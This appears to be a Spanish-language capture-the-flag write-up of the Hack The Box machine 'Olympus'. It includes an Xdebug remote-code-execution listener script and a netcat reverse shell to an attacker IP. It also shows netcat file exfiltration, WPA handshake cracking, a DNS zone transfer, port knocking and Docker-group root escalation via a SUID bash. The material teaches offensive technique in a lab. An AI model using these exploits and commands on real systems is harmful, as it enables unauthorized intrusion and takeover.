---
layout: post
title: HTB Olympus
date: 2023-05-26
slug: HTB_Olympus
heroImage: /assets/machines.jpg
---

# Olympus {-}

## Introduccion {-}

La maquina del dia 22/07/2021 se llama Olympus.

El replay del live se puede ver en [Twitch: S4vitaar Olympus maquina](https://www.twitch.tv/videos/1094808182)
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.83
```
ttl: 63 -> maquina linux
Recuerda que en cuanto a ttl 64 es igual a linux y 128 es igual a windows
pero como estamos en hackthebox hay un nodo intermediario que hace que disminuya el ttl en una unidad 

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.83
```

Si consideras que va muy lento, puedes utilizar los siguientes parametros para que valla mucho mas rapido
```bash
nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.10.83 -oG allPorts
extractPorts allPorts
nmap -sC -sV -p53,80,2222 10.10.10.83 -oN targeted
```

|Puerto|Servicio| Que se nos occure?    |    Que falta?      |
|------|--------|-----------------------|--------------------|
|53    |domain  |Domain zone transfer   |Un nombre de dominio|
|80    |http    |whatweb, http-enum     |Checkear la web     |
|2222  |ssh     |conexion a la maquina  |Usuario contraseña  |


### Empezamos por el puerto 80 {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.83
```

Nada interesante

#### Browsear la web {-}

Hay una imagen, se nos occure steganografia pero no hay nada.

El Wappalyzer no dice que el servidor web empleado es un Apache. 

#### WFuzz {-}

Como no hay mucho mas que ver, aplicaremos **fuzzing** para descubrir si hay mas rutas.

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.83/FUZZ
```

No hay nada, creamos un fichero de extensiones txt, php, html y fuzzeamos otravez.

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -w extensions http://10.10.10.83/FUZZ.FUZ2Z
```

No hay nada.

#### Dig {-}

**Dig** a no confundir con dick ;) es una utilidad que nos permite recojer informaciones a nivel de dns.

1. Añadir la ip y el hostname en el /etc/hosts

    ```bash
    10.10.10.83 olympus.htb
    ```

1. Lanzar **Dig** para recojer informaciones

    ```bash
    dig @10.10.10.83 olympus.htb
    ```

No hay respuesta valida lo que quiere decir que el dominio no es valido

#### Checkear las cabezeras de las respuestas a lado del servidor {-}

```bash
curl -X GET -s "http://10.10.10.83/" -I
```
![Curl_xdebug](/assets/images/curl-xdebug.png)


Algo interessante en la respuesta es el Xdebug 2.5.5. Xdebug es una extension de PHP para hacer debug con haremientas
depuracion tradicionales, desde el editor, tal como se hace en lenguajes de programacion clasicos. Mas informaciones sobre
Xdebug en [desarolloweb.com](https://desarrolloweb.com/articulos/que-es-instalar-configurar-xdebug.html)



## Evaluacion de Vulnerabilidades {-}

### searchsploit {-}

Checkeamos si existe un exploit relacionado con **Xdebug 2.5.5**

```bash
searchsploit xdebug
```

Hay un script en Ruby (Metasploit) que permitiria hacer execucion de commandos. Analizamos el exploit con el commando

```bash
searchsploit -x xdebug
```

Que hace el exploit?

- esta tirando de index.php
- se pone en escucha en el equipo de atacante en el puerto 9000
- usa el comando eval 
- deposita en una ruta del servidor un fichero con su contenido en base64
- ejecuta el fichero con php
- la peticion esta enviada por el methodo GET con 
```bash
 'Cookie' => 'XDEBUG_SESSION=+rand_text_alphanumeric(10)' 
```


### Pruebas del exploit {-}

1. Nos ponemos en escucha en el puerto 9000

    ```bash
    nc -nlvp 9000
    ```

1. Enviamos un peticion GET con el XDEBUG_SESSION en cookie

    ```bash
    curl -s -X GET "http://10.10.10.83/index.php" -H "Cookie: XDEBUG_SESSION=EEEEE"
    ```

Recibimos datos del lado del servidor.

### Explotacion de la vulnerabilidad {-}

Buscamos un exploit en github y encontramos un script cortito que vamos a modificar y llamar exploit_shell.py

```python
#!/usr/bin/python3

import socket
import pdb

from base64 import b64encode

ip_port = ('0.0.0.0', 9000)
sk = socket.socket()
sk.bind(ip_port)
sk.listen(10)
conn, addr = sk.accept()

while True:
    client_data = conn.recv(1024)
    print(client_data)

    data = input('>> ')
    data = data.encode('utf-8')
    conn.sendall(b'eval -i -- ' + b64encode(data) + b'\x00')
```

1. Lanzamos el exploit

    ```bash
    python3 exploit_shell.py
    ```

1. Lanzamos una peticion GET

    ```bash
    curl -s -X GET "http://10.10.10.83/index.php" -H "Cookie: XDEBUG_SESSION=EEEEE"
    ```

1. En la mini shell abierta del exploit_shell.py lanzamos un **whoami**

    ```php
    system('whoami')    
    ```

1. En la respuesta del **curl** se nos pone *www-data*

El exploit funciona y el comando **ifconfig** nos da una ip que no es la 10.10.10.83. Quiere decir que estamos
en un contenedor.
## Explotacion de vulnerabilidad & Ganando acceso {-}


### Ganando acceso con la vuln XDebug {-}

1. Nos ponemos en escucha con netcat

    ```bash
    nc -nlvp 443
    ```

1. Con el exploit exploit_shell.py lanzamos una reverse shell

    ```php
    system('nc -e /bin/bash 10.10.14.20 443')
    ```

De esta manera, hemos ganado acceso al equipo.

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <numero de filas> columns <numero de columnas>
```

### Investigamos la maquina {-}

```bash
cd /home
#Output
zeus

ls /home/zeus
#Output
airgeddon
```

### Airgeddon.cap crack with Aircrack-ng {-}

Airgeddon es una suite de utilidades para hacer auditorias wifi. Entrando en el repertorio airgeddon del usuario zeus encontramos
otro repertorio llamado captured. Filtrando el contenido del directorio aigedon por ficheros 
```bash
 find \-type f 
```
 encontramos un fichero 
**captured.cap** 

Vamos a transferir el fichero captured.cap a nuestro equipo de atacante

1. En la maquina de atacante

    ```bash
    nc -nlvp 443 > captured.cap
    ```

1. En el contenedor

    ```bash
    nc 10.10.14.28 443 < captured.cap
    ```

Sabiendo que Airgeddon es una utilidad de auditoria wifi intentamos ver lo que contiene el **captured.cap** con la utilidad **aircrack-ng**.

```bash
aircrack-ng captured-cap
```
![aircrack-airgeddon](/assets/images/aircrack-airgeddon.png)

Se ve un ESSID que se llama 
```bash
 To_cl0se_to_th3_Sun 
```
 que parece turbio, y un handshake que significa que alguien a esperado que una victima se connecte
o reconecte tras un ataque de deautentificacion y a recuperado el hash de autentificacion.

Analizando la captura con **tshark** se ve que a sido un ataque de deautentificacion

```bash
tshark -r captured.cap 2>/dev/null
```

o filtrado por deautentificacion

```bash
tshark -r captured.cap -Y "wlan.fc.type_subtype==12" -Tfields -e wlan.da 2>/dev/null
```

#### Crackeo con Aircrack-ng {-}

```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt captrured.cap
```

Este crack duraria aprox una hora.

Con investigacion S4vi a pillado una palabra flight en un fichero .txt y buscando por el dios griego del vuelo
encontro que este dios seria icarus.

Para ganar tiempo, se crea un diccionario mas pequeñito que contiene la palabra *icar*

```bash
grep "icar" /usr/share/wordlists/rockyou.txt > dictionary.txt
```

```bash
aircrack-ng -w dictionary.txt captured.cap
```

Ya encontramos la contraseña.

#### Crackeo con John {-}

Extraemos lo que nos interesa del fichero **captured.cap** en un fichero mas pequeñito que se llama Captura.hccap que con la utilidad
**hccap2john** no permite transformarlo en un hash compatible con **John**

```bash
aircrack-ng -J Captura captured.cap
hccap2john Captura.hccap > hash
john -wordlist=/usr/share/wordlists/rockyou.txt hash
```

### Conexion a la maquina victima{-}

Ahora que tenemos un usuario potencial y una contraseña, intentamos conectar con ssh al puerto 2222

```bash
ssh icarus@10.10.10.83
```

Con la contraseña encontrada no nos funciona.
Intentamos con el nombre turbio de esta red inalambrica como contraseña.

**Y PA DENTRO**

### Investigacion de la maquina victima {-}

Hay un fichero que contiene un nombre de dominio valido **ctfolympus.htb**

Intentamos poner el nombre del dominio en el 
```bash
 /etc/hosts 
```
 pero la web sigue siendo la misma.

Sabiendo que el puerto 53 esta abierto y teniendo ahora un nombre de dominio valido, podemos
hacer un ataque de transferencia de zona con **dig**

#### Ataque de transferencia de zona con dig {-}

El tito nos vuelve a decir que es muy importante no confundir la herramienta dig con dick. Dig esta en 
la categoria Ciencia y Tecnologia y la otra en la categoria HotTub ;)

```bash
dig @10.10.10.83 ctfolympus.htb
```

Como **dig** nos responde, ya podemos ir enumerando cosas

1. Enumerar los mail servers

    ```bash
    dig @10.10.10.83 ctfolympus.htb mx
    ```

1. Intentamos un ataque axfr

    ```bash
    dig @10.10.10.83 ctfolympus.htb axfr
    ```
![dig-ctfolympus](/assets/images/dig-ctfolympus.png)

Se puede ver que hay un usuario y una contraseña potencial en un TXT con una lista de puertos.
La idea aqui seria de hacer un **Port Knocking**


### Port Knocking {-}

En este caso la idea seria conectarse al puerto 22 (es una suposicion). El problema es que este puerto esta cerrado. 
La idea de la tecnica de **Port Knocking** es que si el atacante golpea unos puertos en un orden definido, por
iptables se puede exponer o bloquear un puerto.

```bash
nmap -p3456,8234,62431,22 --open -T5 -v -n 10.10.10.83 -r
```

> [!] NOTAS: El argumento 
```bash
 -r 
```
 es para decir a NMAP de scanear los puertos en este mismo orden

Lanzando el comando multiples veces, NMAP nos reporta ahora que el puerto 22 esta ya abierto.
Lo que se puede hacer es, de seguida despues del **Port Knocking** con nmap, lanzar un comando
ssh a la maquina.

```bash
nmap -p3456,8234,62431,22 --open -T5 -v -n 10.10.10.83 -r && ssh prometheus@10.10.10.83
```

Perfecto se nos pregunta por una contraseña **Y PA DENTRO**

En este momento ya se puede ver la flag 
```bash
 user.txt 
```
 y Podemos pasar a la fase de escalacion de privilegios.
## Escalacion de privilegios {-}

### Enumeracion del usuario en la maquina victima {-}

```bash
whoami
id
```

Ya es sufficiente aqui porque ya se puede ver quel usuario esta en el grupo Docker.

### Escalacion de privilegios con Docker {-}

1. Checkear las imagenes Docker existentes

    ```bash
    docker ps
    ```

1. Utilizar una imagen existente para crear un contenedor y **mountarle** la raiz del systema en el contenedor

    ```bash
    docker run --rm -it -v /:/mnt rodhes bash
    cd /mnt/root/
    cat root.txt
    ```

1. Escalar privilegios en la maquina real

    - en el contenedor

        ```bash
        cd /mnt/bin
        chmod 4755 bash
        exit
        ```
    
    - en la maquina real

        ```bash
        bash -p
        whoami

        #Output
        root
        ```

![aircrack-airgeddon](/assets/images/aircrack-airgeddon.png)
